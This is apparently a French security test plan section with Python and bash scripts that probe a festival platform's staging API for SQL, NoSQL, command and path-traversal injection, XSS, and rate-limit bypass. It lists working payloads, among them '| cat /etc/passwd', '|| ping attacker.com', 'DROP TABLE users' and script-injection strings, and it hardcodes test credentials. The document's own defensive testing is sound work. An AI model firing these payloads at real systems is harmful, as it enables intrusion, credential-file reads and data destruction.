# 5. Tests API

## 5.1 Tests d'Injection

```python
#!/usr/bin/env python3
"""
injection_test.py - Tests d'injection SQL, NoSQL, Command
"""
import requests
import json

BASE_URL = "https://staging-api.festival.io"

# Payloads SQL Injection
SQL_PAYLOADS = [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "1; SELECT * FROM users",
    "' UNION SELECT * FROM users--",
    "admin'--",
    "' OR 1=1--",
    "1' AND '1'='1",
    "1' ORDER BY 1--",
    "1' ORDER BY 10--",
]

# Payloads NoSQL Injection
NOSQL_PAYLOADS = [
    {"$gt": ""},
    {"$ne": None},
    {"$where": "1==1"},
    {"$regex": ".*"},
]

# Payloads Command Injection
CMD_PAYLOADS = [
    "; ls -la",
    "| cat /etc/passwd",
    "$(whoami)",
    "`id`",
    "|| ping -c 10 attacker.com",
]

def get_token():
    resp = requests.post(f"{BASE_URL}/api/auth/login", json={
        "email": "user@test.festival.io",
        "password": "TestUser123!"
    })
    return resp.json().get("accessToken")

def test_sql_injection():
    """Test SQL Injection sur les endpoints de recherche"""
    token = get_token()

    print("\n=== Tests SQL Injection ===\n")

    endpoints = [
        "/api/users?search=",
        "/api/festivals?name=",
        "/api/tickets?code=",
    ]

    for endpoint in endpoints:
        for payload in SQL_PAYLOADS:
            url = f"{BASE_URL}{endpoint}{payload}"
            resp = requests.get(url, headers={"Authorization": f"Bearer {token}"})

            # Analyser la reponse
            if resp.status_code == 500:
                print(f"[WARNING] {endpoint} - Erreur 500 avec: {payload[:20]}...")
            elif "error" in resp.text.lower() and "sql" in resp.text.lower():
                print(f"[CRITIQUE] {endpoint} - Erreur SQL exposee: {payload[:20]}...")
            elif resp.status_code == 200 and len(resp.json()) > 100:
                print(f"[WARNING] {endpoint} - Reponse anormale: {payload[:20]}...")

def test_nosql_injection():
    """Test NoSQL Injection"""
    token = get_token()

    print("\n=== Tests NoSQL Injection ===\n")

    # Test sur login
    for payload in NOSQL_PAYLOADS:
        resp = requests.post(f"{BASE_URL}/api/auth/login", json={
            "email": payload,
            "password": payload
        })

        if resp.status_code == 200:
            print(f"[CRITIQUE] NoSQL injection sur login: {payload}")
        else:
            print(f"[OK] Payload rejete: {payload}")

def test_command_injection():
    """Test Command Injection"""
    token = get_token()

    print("\n=== Tests Command Injection ===\n")

    # Endpoints susceptibles (upload, export, etc.)
    for payload in CMD_PAYLOADS:
        # Test sur export filename
        resp = requests.get(
            f"{BASE_URL}/api/analytics/export?filename=report{payload}",
            headers={"Authorization": f"Bearer {token}"}
        )

        if "uid=" in resp.text or "root:" in resp.text:
            print(f"[CRITIQUE] Command injection detectee: {payload}")

def test_path_traversal():
    """Test Path Traversal"""
    token = get_token()

    print("\n=== Tests Path Traversal ===\n")

    payloads = [
        "../../etc/passwd",
        "..\\..\\windows\\system32\\config\\sam",
        "....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc/passwd",
    ]

    for payload in payloads:
        resp = requests.get(
            f"{BASE_URL}/api/files/{payload}",
            headers={"Authorization": f"Bearer {token}"}
        )

        if "root:" in resp.text or resp.status_code == 200:
            print(f"[CRITIQUE] Path traversal: {payload}")
        else:
            print(f"[OK] Bloque: {payload[:30]}...")

if __name__ == "__main__":
    test_sql_injection()
    test_nosql_injection()
    test_command_injection()
    test_path_traversal()
```

## 5.2 Tests XSS

```python
#!/usr/bin/env python3
"""
xss_test.py - Tests XSS (Cross-Site Scripting)
"""
import requests

BASE_URL = "https://staging-api.festival.io"

XSS_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert("XSS")>',
    '"><script>alert("XSS")</script>',
    "'-alert('XSS')-'",
    '<body onload=alert("XSS")>',
    '<iframe src="javascript:alert(\'XSS\')">',
    '{{constructor.constructor("alert(1)")()}}',
    '${alert("XSS")}',
    '<a href="javascript:alert(\'XSS\')">click</a>',
]

def get_token():
    resp = requests.post(f"{BASE_URL}/api/auth/login", json={
        "email": "user@test.festival.io",
        "password": "TestUser123!"
    })
    return resp.json().get("accessToken")

def test_stored_xss():
    """Test Stored XSS"""
    token = get_token()

    print("\n=== Tests Stored XSS ===\n")

    for payload in XSS_PAYLOADS:
        # Test sur profil utilisateur
        resp = requests.put(f"{BASE_URL}/api/users/profile",
                          headers={"Authorization": f"Bearer {token}"},
                          json={"name": payload})

        # Recuperer et verifier si le payload est stocke tel quel
        resp2 = requests.get(f"{BASE_URL}/api/users/profile",
                           headers={"Authorization": f"Bearer {token}"})

        if resp2.status_code == 200:
            data = resp2.json()
            if payload in data.get("name", ""):
                print(f"[CRITIQUE] Stored XSS possible: {payload[:30]}...")
            elif "<" not in data.get("name", "") and "script" not in data.get("name", "").lower():
                print(f"[OK] Payload sanitise")

def test_reflected_xss():
    """Test Reflected XSS"""
    token = get_token()

    print("\n=== Tests Reflected XSS ===\n")

    for payload in XSS_PAYLOADS:
        # Test sur recherche
        resp = requests.get(f"{BASE_URL}/api/festivals?search={payload}",
                          headers={"Authorization": f"Bearer {token}"})

        if payload in resp.text:
            print(f"[CRITIQUE] Reflected XSS: {payload[:30]}...")

def test_dom_xss():
    """Test DOM-based XSS (via API)"""
    print("\n=== Tests DOM XSS ===\n")
    print("[INFO] DOM XSS doit etre teste via le frontend")
    print("       Verifier les endpoints retournant du HTML")

if __name__ == "__main__":
    test_stored_xss()
    test_reflected_xss()
    test_dom_xss()
```

## 5.3 Tests Rate Limiting

```bash
#!/bin/bash
# rate_limit_test.sh - Test du rate limiting

BASE_URL="https://staging-api.festival.io"

echo "=== Test Rate Limiting ==="

# Test 1: Login endpoint (doit etre tres restrictif)
echo -e "\n[Test] Login endpoint (limite: 5 req/min)"
for i in {1..20}; do
    status=$(curl -s -o /dev/null -w "%{http_code}" \
        -X POST "$BASE_URL/api/auth/login" \
        -H "Content-Type: application/json" \
        -d '{"email":"test@test.com","password":"wrong"}')
    echo "Request $i: $status"
    if [ "$status" == "429" ]; then
        echo "[OK] Rate limit active apres $i requetes"
        break
    fi
done

# Test 2: API generale
echo -e "\n[Test] API generale (limite: 100 req/min)"
TOKEN=$(curl -s -X POST "$BASE_URL/api/auth/login" \
    -H "Content-Type: application/json" \
    -d '{"email":"user@test.festival.io","password":"TestUser123!"}' \
    | jq -r '.accessToken')

count=0
for i in {1..200}; do
    status=$(curl -s -o /dev/null -w "%{http_code}" \
        -X GET "$BASE_URL/api/festivals" \
        -H "Authorization: Bearer $TOKEN")
    if [ "$status" == "429" ]; then
        echo "[OK] Rate limit active apres $i requetes"
        count=$i
        break
    fi
done

if [ $count -eq 0 ]; then
    echo "[WARNING] Pas de rate limiting detecte apres 200 requetes"
fi

# Test 3: Bypass attempts
echo -e "\n[Test] Tentatives de bypass"

# X-Forwarded-For spoofing
for ip in "192.168.1.{1..10}"; do
    status=$(curl -s -o /dev/null -w "%{http_code}" \
        -X POST "$BASE_URL/api/auth/login" \
        -H "Content-Type: application/json" \
        -H "X-Forwarded-For: $ip" \
        -d '{"email":"test@test.com","password":"wrong"}')
    echo "X-Forwarded-For: $ip -> $status"
done

echo -e "\n[INFO] Si tous retournent 429, le bypass X-Forwarded-For est bloque"
```

---
